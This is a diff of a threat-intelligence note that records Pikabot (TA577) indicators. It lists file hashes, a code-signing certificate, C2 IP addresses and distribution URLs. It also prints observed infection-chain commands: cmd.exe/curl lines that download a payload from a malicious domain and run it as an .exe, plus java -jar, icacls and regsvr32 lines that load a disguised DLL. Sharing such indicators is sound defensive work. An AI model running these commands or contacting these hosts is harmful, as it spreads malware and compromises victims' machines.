@@ -1,68 +1,55 @@
-12.02.2024 | Pikabot | TA577 | 1.1.17-ghost
+13.02.2024 | Pikabot | TA577 | 
 
 *************************************************
 
-,js a5158b335fc845c92e42d537659efff4f389c5c8b3a2e097be6d4c1cbe11a618
-.js ce616c5d472d8d22169e1cabd8c99a511394b1c28febc944f427137a0354e8db
-.js 97fdebbe05a8a73c836256ae806a398f1af220dd9b384b1e2af83de19bfa7a71
-.exe f4be945a6678a11bc4d2e3819cba8b91665eaf99e152cf0348e16d1fd94b2e75
-.exe aadb6ae3b04b8940f2cc2c65152d9b602bc3f7f8f7809985593149f6e3c7cc83
-.exe b758b935fc420e334d8afdff6dee8253bcdf4b107183b2ad1f32f9f9dd47e0f1
+.zip d4bc0db353dd0051792dd1bfd5a286d3f40d735e21554802978a97599205bd04
+.jar d26ab01b293b2d439a20d1dffc02a5c9f2523446d811192836e26d370a34d1b4
+.dll 7b1c5147c903892f8888f91c98097c89e419ddcc89958a33e294e6dd192b6d4e
 
 *************************************************
 
-zip > js > curl > .dll
-
-wscript.exe C:\Users\Admin\AppData\Local\Temp\Qih.js
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl  0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-cmd.exe /c timeout 10 & C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
-
-timeout  10 
+Code Signing Certificate
+Organisation:  Talk Invest ApS
+Issuer:  SSL.com EV Code Signing Intermediate CA RSA R3
+Algorithm:  sha256WithRSAEncryption
+Valid from: 2024-01-19T13:11:25Z
+Valid to:   2025-01-18T13:11:25Z
+Serial number:  79695808028c2494541535419610a4e0
+Thumbprint Algorithm:   SHA256
+Thumbprint:  aed10cee78c2d2726eccb73d9c248f53f87185492518bdd02c6de94b4087367d
 
 *************************************************
 
-**** .dll distro ****
+zip > .jar > .dll
 
-https://berringtonnews.com/0bvKZ/0.16410464051883017.dat
-https://finderunion.com/CVv/0.7619553765651503.dat
-https://musicclubcompany.com/zmd/0.015044926305028627.dat
+java -jar C:\Users\Admin\AppData\Local\Temp\PERFERENDISF\PERFERENDISF.jar
+
+icacls.exe C:\ProgramData\Oracle\Java\.oracle_jre_usage /grant "everyone":(OI)(CI)M
+
+regsvr32 /s C:\Users\Admin\AppData\Local\Temp\\163520.png
+
+regsvr32.exe /s C:\Users\Admin\AppData\Local\Temp\\163520.png
+
+ctfmon.exe -p 1234
+
+*************************************************
+
+
 
 *************************************************
 
 c2's
 
-https://37.60.242.86:2967
-https://23.226.138.161:5242
-https://37.60.242.85:9785
-https://86.38.225.108:2226
-https://178.18.246.136:2078
-https://86.38.225.106:2221
-https://86.38.225.105:13721
-https://23.226.138.143:2083
-https://85.239.243.155:5000
+86.38.225.106:2221
+104.129.55.106:13783
+23.226.138.161:5242
+45.32.248.100:2226
+45.76.251.190:5631
+103.82.243.5:13785
+104.129.55.105:2223
+37.60.242.86:2967
+23.226.138.161:5242
+37.60.242.86:2967
+
 
 *************************************************
